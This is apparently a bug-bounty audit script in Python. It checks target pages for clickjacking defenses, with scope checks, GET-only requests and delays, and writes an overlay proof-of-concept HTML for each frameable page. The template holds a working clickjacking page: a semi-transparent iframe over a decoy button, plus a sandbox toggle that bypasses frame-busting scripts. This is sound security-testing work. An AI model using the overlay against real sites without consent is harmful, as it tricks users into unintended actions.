#!/usr/bin/env python3
"""Check framing defenses (X-Frame-Options, CSP frame-ancestors) and write PoCs.

For each URL: one GET (with your own session if given), then parse
  - every X-Frame-Options header (DENY, SAMEORIGIN, ALLOW-FROM, invalid, conflicts)
  - enforced Content-Security-Policy frame-ancestors (all CSP headers; most restrictive wins)
  - Content-Security-Policy-Report-Only frame-ancestors (not enforced)
  - <meta> X-Frame-Options and CSP frame-ancestors (both ignored by browsers)
  - JavaScript frame-busting patterns (bypassable with sandbox)
and decide: blocked, same-origin only, allow-list, or frameable. Frameable
pages get an overlay PoC HTML (opacity slider and decoy alignment).

Safety: every host must be the target or its subdomain and pass
scripts/scope_check.sh. GET only, delay 0.5 s by default.

Example:
  clickjack_check.py --target example.com --workspace ~/Documents/bugbounty \
     --urls pages.txt --cookie 'session=OWN' --error-pages \
     --poc-dir artifacts/example.com/clickjacking_pocs --out artifacts/example.com/clickjacking.json
"""
from __future__ import annotations

import argparse
import hashlib
import html
import http.client
import json
import os
import re
import secrets
import ssl
import subprocess
import sys
import time
from urllib.parse import urljoin, urlsplit

REPO = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "..", ".."))
SCOPE = os.path.join(REPO, "scripts", "scope_check.sh")
MAX_URLS = 300
BUSTER_RE = re.compile(
    r"(top\s*(!==?|==)\s*(self|window)|(self|window)\s*(!==?|==)\s*(window\.)?top|top\.location\s*=|"
    r"window\.top\.location|parent\.frames\.length|window\.frameElement|top\.location\.href\s*=)", re.I)
META_RE = re.compile(r"<meta[^>]+http-equiv\s*=\s*[\"']?([\w-]+)[\"']?[^>]*content\s*=\s*[\"']([^\"']*)", re.I)
PERMISSIVE_SOURCES = {"*", "https:", "http:", "https://*", "http://*"}


def run_scope_check(host: str, workspace: str | None, program: str | None = None) -> None:
    cmd = ["bash", SCOPE, host, workspace or "", program or host]
    res = subprocess.run(cmd, capture_output=True, text=True)
    if res.returncode != 0:
        sys.stderr.write(res.stderr or "scope check failed\n")
        sys.exit(res.returncode or 3)


def fetch(url: str, headers: dict, insecure: bool, timeout: float, redirects: int = 3):
    for _ in range(redirects + 1):
        p = urlsplit(url)
        path = (p.path or "/") + (("?" + p.query) if p.query else "")
        if p.scheme == "https":
            ctx = ssl.create_default_context()
            if insecure:
                ctx.check_hostname, ctx.verify_mode = False, ssl.CERT_NONE
            conn = http.client.HTTPSConnection(p.hostname, p.port or 443, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(p.hostname, p.port or 80, timeout=timeout)
        conn.request("GET", path, headers=headers)
        resp = conn.getresponse()
        body = resp.read(500_000).decode("utf-8", errors="replace")
        hdrs = resp.getheaders()
        conn.close()
        loc = resp.getheader("Location")
        if resp.status in (301, 302, 303, 307, 308) and loc:
            nxt = urljoin(url, loc)
            if urlsplit(nxt).hostname != p.hostname:
                return resp.status, hdrs, body, url, f"redirects off-host to {nxt} (not followed)"
            url = nxt
            continue
        return resp.status, hdrs, body, url, None
    return resp.status, hdrs, body, url, "too many redirects"


def parse_frame_ancestors(policies: list[str]) -> list[list[str]]:
    out = []
    for pol in policies:
        for directive in pol.split(";"):
            parts = directive.strip().split()
            if parts and parts[0].lower() == "frame-ancestors":
                out.append([s.strip() for s in parts[1:]])
    return out


def analyze(status: int, hdrs: list[tuple[str, str]], body: str) -> dict:
    xfo_raw = [v for k, v in hdrs if k.lower() == "x-frame-options"]
    csp = [v for k, v in hdrs if k.lower() == "content-security-policy"]
    cspro = [v for k, v in hdrs if k.lower() == "content-security-policy-report-only"]
    notes: list[str] = []
    rows: list[str] = []

    xfo_values = {v.strip().lower() for raw in xfo_raw for v in raw.split(",") if v.strip()}
    xfo_state = "missing"
    if xfo_values:
        if len(xfo_values) > 1:
            xfo_state = "conflicting"
            notes.append(f"conflicting X-Frame-Options {sorted(xfo_values)}: HTML spec treats as blocked; verify per browser (CJ-V-003)")
            rows.append("CJ-V-003")
        else:
            v = next(iter(xfo_values))
            if v == "deny":
                xfo_state = "deny"
            elif v == "sameorigin":
                xfo_state = "sameorigin"
            elif v.startswith("allow-from"):
                xfo_state = "ignored"
                notes.append("ALLOW-FROM is not supported by modern browsers (treated as missing) (CJ-002)")
                rows.append("CJ-002")
            else:
                xfo_state = "ignored"
                notes.append(f"invalid X-Frame-Options value '{v}' is ignored (CJ-002)")
                rows.append("CJ-002")

    fa = parse_frame_ancestors(csp)
    fa_state = "missing"
    fa_sources: list[str] = []
    if fa:
        # Multiple enforced policies: a frame must satisfy all of them.
        lists = [[s.lower() for s in l] for l in fa]
        if any(l == ["'none'"] or not l for l in lists):
            fa_state = "none"
        elif all(any(s in PERMISSIVE_SOURCES for s in l) for l in lists):
            fa_state = "permissive"
            notes.append("frame-ancestors allows any origin (*, https:, http:) (CJ-003)")
            rows.append("CJ-003")
        elif any(l == ["'self'"] for l in lists):
            fa_state = "self"
        else:
            fa_state = "allowlist"
            fa_sources = sorted({s for l in lists for s in l})
            notes.append(f"frame-ancestors allow-list {fa_sources}: check if any listed host can carry attacker content (CJ-V-006)")
            rows.append("CJ-V-006")
            if any(s.startswith("http:") for s in fa_sources):
                notes.append("allow-list contains an http: source")
    ro = parse_frame_ancestors(cspro)
    if ro and not fa:
        notes.append("frame-ancestors only in Content-Security-Policy-Report-Only (not enforced) (CJ-V-005)")
        rows.append("CJ-V-005")

    for name, content in META_RE.findall(body):
        n = name.lower()
        if n == "x-frame-options":
            notes.append("X-Frame-Options in <meta> is ignored by browsers (CJ-V-004)")
            rows.append("CJ-V-004")
        if n == "content-security-policy" and "frame-ancestors" in content.lower():
            notes.append("frame-ancestors in <meta> CSP is ignored by browsers (CJ-003)")
            rows.append("CJ-003")

    buster = bool(BUSTER_RE.search(body))
    if buster:
        notes.append("JavaScript frame-busting found: bypass candidate with sandbox iframe (CJ-V-008)")
        rows.append("CJ-V-008")

    # Enforced CSP frame-ancestors overrides XFO in modern browsers.
    if fa_state == "none":
        verdict = "blocked"
    elif fa_state == "self":
        verdict = "same-origin only"
    elif fa_state == "allowlist":
        verdict = "allow-list"
    elif fa_state == "permissive":
        verdict = "frameable"
    elif xfo_state in ("deny", "conflicting"):
        verdict = "blocked"
    elif xfo_state == "sameorigin":
        verdict = "same-origin only"
    else:
        verdict = "frameable"
    if verdict == "same-origin only":
        notes.append("same-origin framing allowed: look for same-origin content you control (CJ-004)")
        rows.append("CJ-004")
    if verdict == "frameable":
        rows += ["CJ-001", "CJ-002", "CJ-003", "CJ-010"]
    if verdict == "frameable" and buster:
        verdict = "frameable (frame-buster present)"

    cookies = [v for k, v in hdrs if k.lower() == "set-cookie"]
    samesite = sorted({(re.search(r"samesite=(\w+)", c, re.I).group(1).lower() if re.search(r"samesite=(\w+)", c, re.I) else "unset")
                       for c in cookies})
    content_type = next((v for k, v in hdrs if k.lower() == "content-type"), "")
    if "html" not in content_type.lower():
        notes.append(f"content-type '{content_type}' is not HTML; framing risk is low")

    return {
        "status": status, "verdict": verdict, "xfo_raw": xfo_raw, "xfo_state": xfo_state,
        "frame_ancestors": fa, "frame_ancestors_state": fa_state, "report_only_frame_ancestors": ro,
        "frame_buster_js": buster, "set_cookie_samesite": samesite, "content_type": content_type,
        "checklist_rows": sorted(set(rows)), "notes": notes,
    }


POC = """<!doctype html>
<html><head><meta charset="utf-8"><title>Clickjacking PoC</title><style>
  body {{ font: 14px sans-serif; }}
  #target {{ position: relative; width: 1000px; height: 700px; opacity: 0.5; z-index: 2; border: 1px dashed #999; }}
  #decoy {{ position: absolute; top: 300px; left: 400px; z-index: 1; padding: 12px 24px;
           background: #2a7; color: #fff; font-size: 18px; }}
</style></head><body>
<p>Target: {url_text}<br>Verdict: {verdict}. Open in your own victim profile; confirm the page loads logged in.</p>
<div>
  opacity <input type="range" min="0" max="1" step="0.05" value="0.5"
    oninput="document.getElementById('target').style.opacity=this.value">
  top <input type="number" value="300" oninput="document.getElementById('decoy').style.top=this.value+'px'">
  left <input type="number" value="400" oninput="document.getElementById('decoy').style.left=this.value+'px'">
  <label><input type="checkbox" onchange="var f=document.getElementById('target');
    if(this.checked){{f.setAttribute('sandbox','allow-forms allow-scripts allow-same-origin')}}else{{f.removeAttribute('sandbox')}};
    f.src=f.src;"> sandbox (frame-buster bypass)</label>
</div>
<div id="decoy">Click here</div>
<iframe id="target" src="{url_attr}"></iframe>
</body></html>
"""


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True)
    ap.add_argument("--workspace")
    ap.add_argument("--url", action="append", default=[])
    ap.add_argument("--urls", help="file with URLs, one per line")
    ap.add_argument("--cookie", help="own session cookie")
    ap.add_argument("--header", action="append", default=[], help="extra header 'Name: value'")
    ap.add_argument("--error-pages", action="store_true", help="also check a random 404 path per host (CJ-V-001)")
    ap.add_argument("--poc-dir", help="write a PoC HTML per frameable URL here")
    ap.add_argument("--delay", type=float, default=0.5)
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--out")
    args = ap.parse_args()

    urls = list(args.url)
    if args.urls:
        urls += [l.strip() for l in open(args.urls, encoding="utf-8") if l.strip() and not l.startswith("#")]
    urls = [u if "://" in u else "https://" + u for u in urls]
    if not urls:
        sys.exit("give --url or --urls")
    target = args.target.lower()
    hosts = {}
    for u in urls:
        p = urlsplit(u)
        h = (p.hostname or "").lower()
        if not (h == target or h.endswith("." + target)):
            sys.exit(f"{u}: host {h} is not {target} or a subdomain of it")
        hosts.setdefault(h, f"{p.scheme}://{p.netloc}")
    for h in hosts:
        run_scope_check(h, args.workspace, args.target.lower())
    if args.error_pages:
        urls += [f"{base}/cj-404-{secrets.token_hex(4)}" for base in hosts.values()]
    urls = list(dict.fromkeys(urls))[:MAX_URLS]

    headers = {"User-Agent": "Mozilla/5.0 clickjacking-audit", "Accept": "text/html,*/*"}
    if args.cookie:
        headers["Cookie"] = args.cookie
    for hv in args.header:
        k, _, v = hv.partition(":")
        headers[k.strip()] = v.strip()

    results = []
    for i, url in enumerate(urls):
        if i:
            time.sleep(args.delay)
        try:
            status, hdrs, body, final, warn = fetch(url, headers, args.insecure, args.timeout)
        except Exception as e:
            results.append({"url": url, "error": str(e)})
            print(f"[error] {url}: {e}")
            continue
        r = {"url": url, "final_url": final, **analyze(status, hdrs, body)}
        if warn:
            r["notes"].append(warn)
        if args.poc_dir and r["verdict"].startswith("frameable"):
            os.makedirs(args.poc_dir, exist_ok=True)
            name = "cj_" + hashlib.sha1(final.encode()).hexdigest()[:10] + ".html"
            path = os.path.join(args.poc_dir, name)
            open(path, "w", encoding="utf-8").write(POC.format(
                url_text=html.escape(final), url_attr=html.escape(final, quote=True), verdict=r["verdict"]))
            r["poc"] = path
        results.append(r)
        print(f"[{r['verdict']}] {status} {url}")
        for n in r["notes"]:
            print(f"    - {n}")
        if r.get("poc"):
            print(f"    PoC: {r['poc']}")

    summary = {
        "checked": len(results),
        "frameable": [r["url"] for r in results if r.get("verdict", "").startswith("frameable")],
        "same_origin_only": [r["url"] for r in results if r.get("verdict") == "same-origin only"],
        "allow_list": [r["url"] for r in results if r.get("verdict") == "allow-list"],
        "blocked": [r["url"] for r in results if r.get("verdict") == "blocked"],
    }
    report = {"target": target, "summary": summary, "results": results,
              "note": "Frameable is a lead. A finding needs a sensitive action completed on your own victim account "
                      "through the frame in a current browser (check the page loads logged in)."}
    if args.out:
        os.makedirs(os.path.dirname(os.path.abspath(args.out)), exist_ok=True)
        open(args.out, "w", encoding="utf-8").write(json.dumps(report, indent=2))
        print(f"results: {args.out}")
    print(f"frameable {len(summary['frameable'])}, same-origin {len(summary['same_origin_only'])}, "
          f"allow-list {len(summary['allow_list'])}, blocked {len(summary['blocked'])}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
